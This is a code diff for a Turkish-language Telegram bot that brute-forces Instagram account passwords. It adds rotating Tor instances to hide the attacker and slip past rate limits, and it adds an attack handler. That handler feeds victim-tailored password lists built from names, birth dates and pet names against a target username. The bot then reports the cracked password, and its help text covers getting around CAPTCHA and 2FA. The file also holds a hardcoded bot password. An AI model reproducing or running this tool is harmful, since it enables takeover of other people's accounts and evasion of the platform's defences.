@@ -6,6 +6,7 @@ import json
 import re
 import requests
 import itertools
+import os
 from typing import List, Optional
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
 from telegram.ext import (
@@ -24,8 +25,8 @@ from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.common.action_chains import ActionChains
 from selenium.common.exceptions import TimeoutException, NoSuchElementException
-from urllib.parse import quote
-import os
+import subprocess
+import signal
 
 # Log ayarları
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
@@ -39,6 +40,10 @@ BOT_PASSWORD = "vio1911"
 
 # Proxy API (ücretsiz proxy listesi)
 PROXY_API_URL = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
+
+# Tor configuration
+TOR_PORTS = [9051, 9052, 9053, 9054, 9055]
+TOR_PROCESSES = []
 
 # CUPP tarzı şifre oluşturucu için yapılandırma
 class PasswordGenerator:
@@ -798,6 +803,88 @@ class InstagramBruteForce:
             logger.error(f"Progress callback error: {e}")
         return None
 
+# Tor başlatma fonksiyonu
+def start_tor_instances():
+    """Multiple Tor instances başlat"""
+    global TOR_PROCESSES
+    
+    # Önce mevcut Tor işlemlerini temizle
+    stop_tor_instances()
+    
+    # Tor instance'ları başlat
+    for port in TOR_PORTS:
+        try:
+            data_dir = f"/var/lib/tor{port}"
+            os.makedirs(data_dir, exist_ok=True)
+            
+            # Tor konfigürasyonu
+            tor_cmd = [
+                "tor",
+                "--SocksPort", str(port),
+                "--DataDirectory", data_dir,
+                "--ControlPort", str(port + 1000),
+                "--RunAsDaemon", "1"
+            ]
+            
+            process = subprocess.Popen(tor_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            TOR_PROCESSES.append(process)
+            logger.info(f"Tor instance başlatıldı: Port {port}")
+        except Exception as e:
+            logger.error(f"Tor instance başlatılamadı (Port {port}): {e}")
+    
+    # Tor instance'ların hazır olmasını bekle
+    time.sleep(5)
+    
+    # Tor bağlantılarını kontrol et
+    working_ports = []
+    for port in TOR_PORTS:
+        try:
+            response = requests.get(
+                "https://check.torproject.org/",
+                proxies={"http": f"socks5://127.0.0.1:{port}", "https": f"socks5://127.0.0.1:{port}"},
+                timeout=10
+            )
+            if "Congratulations" in response.text:
+                working_ports.append(port)
+                logger.info(f"Tor instance çalışıyor: Port {port}")
+            else:
+                logger.warning(f"Tor instance çalışmıyor: Port {port}")
+        except Exception as e:
+            logger.warning(f"Tor instance bağlantı hatası (Port {port}): {e}")
+    
+    return working_ports
+
+# Tor durdurma fonksiyonu
+def stop_tor_instances():
+    """Tüm Tor instances durdur"""
+    global TOR_PROCESSES
+    
+    for process in TOR_PROCESSES:
+        try:
+            process.terminate()
+            process.wait(timeout=5)
+        except:
+            try:
+                process.kill()
+            except:
+                pass
+    
+    # Tüm tor işlemlerini sonlandır
+    os.system("pkill -f tor")
+    TOR_PROCESSES = []
+    logger.info("Tüm Tor instances durduruldu")
+
+# Signal handler for graceful shutdown
+def signal_handler(signum, frame):
+    """Elegant çıkış için signal handler"""
+    logger.info("Bot kapatılıyor...")
+    stop_tor_instances()
+    exit(0)
+
+# Signal handlers kaydet
+signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGTERM, signal_handler)
+
 class TelegramBot:
     def __init__(self):
         self.user_data = {}
@@ -821,7 +908,17 @@ class TelegramBot:
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         self._initialize_user_data(user_id)
+        
+        # Banner göster
+        banner = """
+  _              _            _____                                  
+ (_) _ __   ___ | |_   __ _   \_   \ _ __   ___   __ _  _ __    ___ 
+ | || '_ \ / __|| __| / _` |   / /\/| '_ \ / __| / _` || '_ \  / _ \
+ | || | | |\__ \| |_ | (_| |/\/ /_  | | | |\__ \| (_| || | | ||  __/
+ |_||_| |_||___/ \__| \__,_|\____/  |_| |_||___/ \__,_||_| |_| \___|
+        """
         try:
+            await update.message.reply_text(f"```{banner}```", parse_mode='Markdown')
             await update.message.reply_text("🔒 Lütfen bot şifresini girin:")
             context.user_data['awaiting'] = 'password'
         except TelegramError as e:
@@ -857,6 +954,7 @@ class TelegramBot:
                     [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                     [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                     [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                    [InlineKeyboardButton("🔄 Tor Instances Başlat", callback_data='start_tor')],
                     [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                     [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
                     [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
@@ -1109,6 +1207,7 @@ class TelegramBot:
             [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
             [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
             [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+            [InlineKeyboardButton("🔄 Tor Instances Başlat", callback_data='start_tor')],
             [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
             [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
             [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
@@ -1209,6 +1308,16 @@ class TelegramBot:
         elif query.data == 'randnum_no':
             self.user_data[user_id]['password_profile']['randnum'] = False
             await self.generate_password_file(query, user_id)
+        elif query.data == 'start_tor':
+            try:
+                await query.message.reply_text("🔄 Tor instances başlatılıyor...")
+                working_ports = start_tor_instances()
+                if working_ports:
+                    await query.message.reply_text(f"✅ Tor instances başlatıldı! Çalışan portlar: {working_ports}")
+                else:
+                    await query.message.reply_text("❌ Tor instances başlatılamadı!")
+            except Exception as e:
+                await query.message.reply_text(f"❌ Tor instances başlatılırken hata: {str(e)}")
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
         elif query.data == 'skip_lastname':
@@ -1280,10 +1389,11 @@ class TelegramBot:
                 "1. *Kullanıcı Adı Gir* 🎯: Hedef Instagram kullanıcı adını yaz (max 30 karakter).\n"
                 "2. *Şifre Listesi Yükle veya Oluştur* 📜🔑:\n"
                 "   - *Yükle*: Hazır bir .txt dosyasında şifre listeni yükle (her satır bir şifre, max 512 karakter).\n"
-                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap (max 100.000 şifre). Leet mode (ör: leet → 1337), özel karakterler (!@#) ve rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
+                "   - *Oluştur*: Ad, soyad, doğum tarihi, evcil hayvan adı, şirket adı veya anahtar kelimeler girerek kişiselleştirilmiş şifre listesi yap (max 100.000 şifre). Leet mode (ör: leet → 1337), özel karakterler (!@#) và rastgele sayılar (01-99) ekleyebilirsin. Liste hazır olunca .txt olarak indirilecek!\n"
                 "3. *Proxy Listesi Yükle* 🌐 (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle veya bot otomatik proxy çeker.\n"
-                "4. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
-                "5. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force’u başlat. İşlem bitince rapor alacaksın:\n"
+                "4. *Tor Instances Başlat* 🔄: Yerel Tor instances başlat (9051-9055 portları).\n"
+                "5. *Timeout Ayarla* ⏰: İşlemin ne kadar süreceğini (60-7200 saniye) belirle.\n"
+                "6. *Saldırıyı Başlat* 🚀: Her şey hazır olunca brute-force'u başlat. İşlem bitince rapor alacaksın:\n"
                 "   - Denenen şifre sayısı\n"
                 "   - Hata alınan şifreler (doğru olabilir, manuel kontrol et)\n"
                 "   - İşlem logları (instagram_response.json olarak indirilir)\n\n"
@@ -1291,7 +1401,7 @@ class TelegramBot:
                 "- Boş bırakmak için her adımda *Boş Bırak* butonunu kullan.\n"
                 "- İşlemi durdurmak için *İptal* butonuna bas.\n"
                 "- Şifre listesi oluştururken çok fazla kelime ekleme, yoksa liste devasa olur! 😅\n"
-                "- CAPTCHA çıkarsa, Instagram’a gidip manuel çözmen gerekir.\n"
+                "- CAPTCHA çıkarsa, Instagram'a gidip manuel çözmen gerekir.\n"
                 "- 2FA veya checkpoint çıkarsa, doğru şifreyi bulduk ama doğrulama yapman lazım!\n\n"
                 "*🚀 Hadi Başla!* Menüden bir seçenek seç ve keyfine bak! 😜"
             )
@@ -1301,6 +1411,7 @@ class TelegramBot:
                 [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                 [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                 [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                [InlineKeyboardButton("🔄 Tor Instances Başlat", callback_data='start_tor')],
                 [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                 [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
             ]
@@ -1318,6 +1429,7 @@ class TelegramBot:
                 [InlineKeyboardButton("🔑 Şifre Listesi Oluştur", callback_data='generate_password_list')],
                 [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
                 [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
+                [InlineKeyboardButton("🔄 Tor Instances Başlat", callback_data='start_tor')],
                 [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')],
                 [InlineKeyboardButton("📖 Nasıl Kullanırım?", callback_data='how_to_use')],
                 [InlineKeyboardButton("❌ İptal", callback_data='cancel')]
@@ -1348,4 +1460,118 @@ class TelegramBot:
         try:
             await query.message.reply_text(f"✅ Şifre listesi oluşturuldu! {len(wordlist)} şifre kaydedildi.")
             await query.message.reply_document(document=InputFile(file_path, filename='generated_passwords.txt'))
-        except Telegram
+        except TelegramError as e:
+            logger.error(f"Telegram send_message error: {e}")
+
+    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        await query.answer()
+        user_id = query.from_user.id
+        
+        if not self.user_data[user_id]['username']:
+            try:
+                await query.message.reply_text("❌ Önce bir kullanıcı adı ayarla!")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        
+        if not self.user_data[user_id]['password_file']:
+            try:
+                await query.message.reply_text("❌ Önce bir şifre listesi yükle veya oluştur!")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        
+        # Şifre listesini oku
+        try:
+            with open(self.user_data[user_id]['password_file'], 'r', encoding='utf-8') as f:
+                passwords = [line.strip() for line in f if line.strip()]
+        except Exception as e:
+            try:
+                await query.message.reply_text(f"❌ Şifre listesi okunamadı: {str(e)}")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+            return
+        
+        # Proxy listesini oku (eğer varsa)
+        proxy_list = []
+        if self.user_data[user_id]['proxy_file']:
+            try:
+                with open(self.user_data[user_id]['proxy_file'], 'r', encoding='utf-8') as f:
+                    proxy_list = [line.strip() for line in f if line.strip()]
+            except Exception as e:
+                try:
+                    await query.message.reply_text(f"⚠️ Proxy listesi okunamadı: {str(e)}")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+        
+        # Tor proxy'lerini ekle (eğer çalışıyorsa)
+        try:
+            for port in TOR_PORTS:
+                proxy_list.append(f"socks5://127.0.0.1:{port}")
+        except:
+            pass
+        
+        # Brute force başlat
+        try:
+            await query.message.reply_text(f"🚀 Saldırı başlatılıyor...\nHedef: {self.user_data[user_id]['username']}\nŞifre sayısı: {len(passwords)}\nTimeout: {self.user_data[user_id]['timeout']}s")
+            
+            instagram_brute = InstagramBruteForce(proxy_list=proxy_list)
+            
+            # Progress callback fonksiyonu
+            async def progress_callback(message):
+                try:
+                    await query.message.reply_text(message)
+                except TelegramError as e:
+                    logger.error(f"Progress callback error: {e}")
+            
+            # Brute force'u başlat
+            result = await instagram_brute.brute_force(
+                self.user_data[user_id]['username'],
+                passwords,
+                self.user_data[user_id]['timeout'],
+                progress_callback
+            )
+            
+            if result:
+                try:
+                    await query.message.reply_text(f"🎉 BAŞARILI! Şifre bulundu: {result}")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+            else:
+                try:
+                    await query.message.reply_text("❌ Şifre bulunamadı! Daha fazla şifre ile tekrar dene.")
+                except TelegramError as e:
+                    logger.error(f"Telegram send_message error: {e}")
+                    
+        except Exception as e:
+            try:
+                await query.message.reply_text(f"❌ Saldırı sırasında hata oluştu: {str(e)}")
+            except TelegramError as e:
+                logger.error(f"Telegram send_message error: {e}")
+
+def main():
+    # Tor instances başlat
+    working_ports = start_tor_instances()
+    if working_ports:
+        logger.info(f"Tor instances başlatıldı: {working_ports}")
+    else:
+        logger.warning("Tor instances başlatılamadı!")
+    
+    # Telegram bot başlat
+    application = Application.builder().token(TOKEN).build()
+    bot = TelegramBot()
+    
+    # Handlers
+    application.add_handler(CommandHandler("start", bot.start))
+    application.add_handler(CallbackQueryHandler(bot.button))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
+    
+    # Botu başlat
+    application.run_polling()
+    
+    # Bot kapatıldığında Tor instances durdur
+    stop_tor_instances()
+
+if __name__ == '__main__':
+    main()
